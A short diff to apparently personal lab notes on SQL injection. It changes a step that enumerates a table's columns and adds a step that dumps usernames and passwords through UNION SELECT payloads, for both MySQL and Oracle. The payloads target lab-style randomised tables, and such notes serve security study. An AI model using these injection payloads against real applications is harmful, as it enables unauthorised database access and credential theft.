@@ -23,6 +23,12 @@ enum until it shows error so how many columns are the number before error (for e
 
 # 5. read specific table structure
 
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_sfbljr' AND table_schema=database()-- (mysql)
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='USERS_FGOOHN' AND table_schema=database()-- (mysql)
 
-' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_SFBLJR'-- (oracle)
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_FGOOHN'-- (oracle)
+
+# 6. dump all data from specific columns
+as example u retrived USERS_FGOOHN table which saves all users information.
+
+' UNION SELECT USERNAME_DZLLNY,PASSWORD_CGOGXE FROM USERS_FGOOHN-- (mysql)
+' UNION SELECT USERNAME_DZLLNY,PASSWORD_CGOGXE FROM USERS_FGOOHN-- (oracle)
